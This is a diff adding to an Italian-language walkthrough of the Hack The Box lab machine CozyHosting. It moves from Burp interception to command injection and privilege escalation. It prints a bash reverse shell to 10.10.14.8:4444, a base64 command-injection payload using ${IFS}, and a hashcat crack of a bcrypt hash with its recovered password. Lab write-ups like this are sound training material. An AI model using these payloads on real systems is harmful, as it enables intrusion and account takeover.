@@ -136,16 +136,118 @@ Da qui riesco a recuperare l'id di sessione dell'utente _kanderson_. Utilizzando
   <img src="/Immagini/Linux-Box/CozyHosting/cozyhosting-3.png"/>
 </p>
 
+Provo ad utilzzare il form riempendo i campi e inviando la richiesta:
 
+<p align="center">
+  <img src="/Immagini/Linux-Box/CozyHosting/cozyhosting-4.png"/>
+</p>
 
+Intercetto la richiesta su burp:
 
+<p align="center">
+  <img src="/Immagini/Linux-Box/CozyHosting/cozyhosting-5.png"/>
+</p>
 
-
+Invio la richiesta al Repeater e la modifico eliminando l'username. Dalla risposta ricevuta capisco che potrebbe essere vulberabile al command injection.
 
 ## Exploitation
 
-...
+Per provare a sfruttare questa vulnerabilità avvio un listener sulla porta 4444 e trasformo in base64 il seguente comando:
+
+```text
+"bash -i >& /dev/tcp/10.10.14.8/4444 0>&1"
+```
+
+```text
+echo "bash -i >& /dev/tcp/10.10.14.8/4444 0>&1" | base64 -w 0
+```
+
+Ottenendo questo:
+
+```text
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQo=
+```
+
+Provo ad inviare nuovamente la richiesta inserendo nel campo username il seguente testo:
+
+```text
+;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQo="|base64${IFS}-d|bash;
+```
+
+<p align="center">
+  <img src="/Immagini/Linux-Box/CozyHosting/cozyhosting-6.png"/>
+</p>
+
+**Sono dentro!**
+
+<p align="center">
+  <img src="/Immagini/Linux-Box/CozyHosting/cozyhosting-7.png"/>
+</p>
+
 
 ## Privilege Escalation
 
-...
+Per prima cosa trasferisco sulla mia macchina il file _cloudhosting-0.0.1.jar_.
+
+Per farlo avvio un server http (porta 8888) tramite python sulla macchia cozyhosting e scarico il file visitando la pagina http://10.10.11.230:8888:
+
+
+<p align="center">
+  <img src="/Immagini/Linux-Box/CozyHosting/cozyhosting-8.png"/>
+</p>
+
+Ispezionando il jar mi imbatto nel seguente file:
+
+<p align="center">
+  <img src="/Immagini/Linux-Box/CozyHosting/cozyhosting-9.png"/>
+</p>
+
+Quindi utilizzo le credenziali trovate per accedere al DB POSTGRESQL:
+
+<p align="center">
+  <img src="/Immagini/Linux-Box/CozyHosting/cozyhosting-10.png"/>
+</p>
+
+Provo ad ottenere informazioni sull'hash trovato tramite il comando _hashid_:
+
+
+```text
+Analyzing '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'
+[+] Blowfish(OpenBSD)
+[+] Woltlab Burning Board 4.x
+[+] bcrypt
+```
+
+Quindi cerco di scoprire la password nascosta dietro l'hash tramite _hashcat_:
+
+```text
+echo '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' > hash.txt      
+```                                                                                                                                    
+```text
+hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+Questo è l'output del comando:
+
+```text
+$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
+```
+
+**Ho la password per l'utente josh!**
+
+<p align="center">
+  <img src="/Immagini/Linux-Box/CozyHosting/cozyhosting-11.png"/>
+</p>
+
+
+Ora bisogna capire come diventare l'utente root. Per prima cosa controllo i permessi dell'utente:
+
+<p align="center">
+  <img src="/Immagini/Linux-Box/CozyHosting/cozyhosting-12.png"/>
+</p>
+
+Sfrutto la seguente [guida](https://gtfobins.github.io/gtfobins/ssh/#sudo) per diventare l'utente root:
+
+<p align="center">
+  <img src="/Immagini/Linux-Box/CozyHosting/cozyhosting-13.png"/>
+</p>
